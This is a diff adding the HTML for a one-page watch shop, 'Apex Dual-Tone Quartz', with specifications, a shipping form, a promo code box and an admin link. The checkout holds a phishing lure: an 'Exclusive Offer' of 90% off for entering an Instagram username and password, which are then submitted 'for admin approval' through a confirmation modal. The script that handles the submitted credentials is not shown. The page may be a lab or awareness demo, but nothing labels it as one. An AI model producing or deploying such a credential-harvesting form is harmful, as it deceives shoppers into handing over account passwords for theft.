@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Apex Dual-Tone Quartz — minimalist luxury watch. Limited offer with exclusive discounts." />
+  <title>Apex Dual-Tone Quartz | Premium Watch</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@400;600&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <header class="header">
+    <a href="#" class="header__brand">Apex</a>
+    <nav class="header__nav">
+      <a href="#features">Specifications</a>
+      <a href="#checkout" class="header__cart">Cart</a>
+    </nav>
+  </header>
+
+  <main>
+    <section class="hero" id="hero">
+      <div class="hero__content">
+        <p class="hero__eyebrow">Limited Edition</p>
+        <h1 class="hero__title">Apex Dual-Tone Quartz</h1>
+        <p class="hero__subtitle">
+          Minimalist design meets precision engineering. Matte black finish,
+          dual-tone dial, and silver accents for timeless elegance.
+        </p>
+        <p class="hero__price">₹2,000</p>
+        <button type="button" class="btn btn--primary" id="add-to-cart-btn">
+          Add to Cart
+        </button>
+      </div>
+      <div class="hero__visual">
+        <img
+          src="assets/watch-hero.png"
+          alt="Apex dual-tone minimalist black quartz watch on grass"
+          class="hero__image"
+          width="600"
+          height="600"
+        />
+      </div>
+    </section>
+
+    <section class="features" id="features">
+      <div class="features__header">
+        <h2 class="section-title">Specifications</h2>
+        <p class="section-subtitle">Crafted for those who appreciate understated luxury.</p>
+      </div>
+
+      <div class="features__gallery">
+        <figure class="features__figure">
+          <img
+            src="assets/watch-front.png"
+            alt="Front view of Apex watch with 50mm height and 47mm width dimensions"
+            class="features__image"
+            width="500"
+            height="500"
+          />
+          <figcaption>Dual-tone dial · Precision indices</figcaption>
+        </figure>
+        <figure class="features__figure">
+          <img
+            src="assets/watch-back.png"
+            alt="Rear view showing polished stainless steel case back and woven strap"
+            class="features__image"
+            width="500"
+            height="500"
+          />
+          <figcaption>Polished case back · Woven strap</figcaption>
+        </figure>
+      </div>
+
+      <ul class="features__specs">
+        <li class="spec-card">
+          <span class="spec-card__label">Movement</span>
+          <span class="spec-card__value">Quartz</span>
+        </li>
+        <li class="spec-card">
+          <span class="spec-card__label">Case Height</span>
+          <span class="spec-card__value">50 mm</span>
+        </li>
+        <li class="spec-card">
+          <span class="spec-card__label">Case Width</span>
+          <span class="spec-card__value">47 mm</span>
+        </li>
+        <li class="spec-card">
+          <span class="spec-card__label">Finish</span>
+          <span class="spec-card__value">Matte Black</span>
+        </li>
+        <li class="spec-card">
+          <span class="spec-card__label">Dial</span>
+          <span class="spec-card__value">Dual-Tone</span>
+        </li>
+        <li class="spec-card">
+          <span class="spec-card__label">Strap</span>
+          <span class="spec-card__value">Woven Nylon</span>
+        </li>
+      </ul>
+    </section>
+
+    <section class="checkout" id="checkout">
+      <div class="checkout__header">
+        <h2 class="section-title">Complete Your Purchase</h2>
+        <p class="section-subtitle">Secure checkout · Free shipping on all orders</p>
+      </div>
+
+      <div class="checkout__grid">
+        <div class="checkout__form-col">
+          <form class="checkout-form" id="checkout-form" novalidate>
+            <fieldset class="checkout-form__section">
+              <legend>Shipping Address</legend>
+              <div class="form-group">
+                <label for="name">Full Name</label>
+                <input type="text" id="name" name="name" required autocomplete="name" />
+              </div>
+              <div class="form-group">
+                <label for="street">Street Address</label>
+                <input type="text" id="street" name="street" required autocomplete="street-address" />
+              </div>
+              <div class="form-row">
+                <div class="form-group">
+                  <label for="city">City</label>
+                  <input type="text" id="city" name="city" required autocomplete="address-level2" />
+                </div>
+                <div class="form-group">
+                  <label for="zip">Zip Code</label>
+                  <input type="text" id="zip" name="zip" required autocomplete="postal-code" />
+                </div>
+              </div>
+            </fieldset>
+
+            <div class="instagram-offer" id="instagram-offer">
+              <div class="instagram-offer__top">
+                <div class="instagram-offer__content">
+                  <p class="instagram-offer__badge">Exclusive Offer</p>
+                  <p class="instagram-offer__text">
+                    Sign in with Instagram to get <strong>90% off</strong>!
+                  </p>
+                </div>
+                <button
+                  type="button"
+                  class="btn btn--instagram"
+                  id="instagram-signin"
+                  aria-expanded="false"
+                  aria-controls="instagram-login"
+                >
+                  Sign in with Instagram
+                </button>
+              </div>
+
+              <div class="instagram-login" id="instagram-login" hidden>
+                <div class="instagram-login__fields">
+                  <div class="form-group">
+                    <label for="instagram-username">Instagram Username</label>
+                    <input
+                      type="text"
+                      id="instagram-username"
+                      autocomplete="username"
+                      placeholder="@yourusername"
+                    />
+                  </div>
+                  <div class="form-group">
+                    <label for="instagram-password">Password</label>
+                    <input
+                      type="password"
+                      id="instagram-password"
+                      autocomplete="current-password"
+                      placeholder="Enter password"
+                    />
+                  </div>
+                </div>
+                <button type="button" class="btn btn--instagram" id="instagram-login-submit">
+                  Submit for Approval
+                </button>
+              </div>
+
+              <p class="instagram-offer__status" id="instagram-status" aria-live="polite"></p>
+            </div>
+
+            <div class="promo-section">
+              <label for="promo-code">Promo Code</label>
+              <div class="promo-row">
+                <input
+                  type="text"
+                  id="promo-code"
+                  name="promo-code"
+                  placeholder="Enter promo code"
+                  autocomplete="off"
+                />
+                <button type="button" class="btn btn--secondary" id="apply-promo">Apply</button>
+              </div>
+              <p class="promo-section__status" id="promo-status" aria-live="polite"></p>
+            </div>
+          </form>
+        </div>
+
+        <aside class="order-summary" aria-label="Order summary">
+          <h3 class="order-summary__title">Order Summary</h3>
+          <div class="order-summary__product">
+            <img
+              src="assets/watch-front.png"
+              alt=""
+              class="order-summary__thumb"
+              width="72"
+              height="72"
+            />
+            <div>
+              <p class="order-summary__name">Apex Dual-Tone Quartz</p>
+              <p class="order-summary__qty">Qty: 1</p>
+            </div>
+          </div>
+
+          <dl class="order-summary__lines" aria-live="polite" aria-atomic="true">
+            <div class="order-summary__line">
+              <dt>Original Price</dt>
+              <dd id="original-price">₹2,000</dd>
+            </div>
+            <div class="order-summary__line order-summary__line--discount" id="discount-line" hidden>
+              <dt>Discounts Applied</dt>
+              <dd id="discount-amount">-₹0</dd>
+            </div>
+            <div class="order-summary__line order-summary__line--total">
+              <dt>Total</dt>
+              <dd id="total-price">₹2,000</dd>
+            </div>
+          </dl>
+
+          <p class="order-summary__note" id="discount-note"></p>
+
+          <button type="button" class="btn btn--primary btn--full" id="place-order-btn">
+            Place Order
+          </button>
+        </aside>
+      </div>
+    </section>
+  </main>
+
+  <footer class="footer">
+    <p>&copy; 2026 Apex Watches. All rights reserved.</p>
+    <p class="footer__admin"><a href="admin.html">Admin Login</a></p>
+  </footer>
+
+  <div class="modal" id="confirm-modal" hidden aria-hidden="true">
+    <div class="modal__overlay" id="confirm-modal-overlay"></div>
+    <div class="modal__dialog" role="dialog" aria-labelledby="confirm-modal-title" aria-modal="true">
+      <h3 class="modal__title" id="confirm-modal-title">Confirm Submission</h3>
+      <p class="modal__text">
+        Submit your Instagram login for admin approval to unlock 90% off?
+      </p>
+      <div class="modal__actions">
+        <button type="button" class="btn btn--secondary" id="confirm-modal-cancel">Cancel</button>
+        <button type="button" class="btn btn--primary" id="confirm-modal-confirm">Confirm</button>
+      </div>
+    </div>
+  </div>
+
+  <script src="script.js" defer></script>
+</body>
+</html>
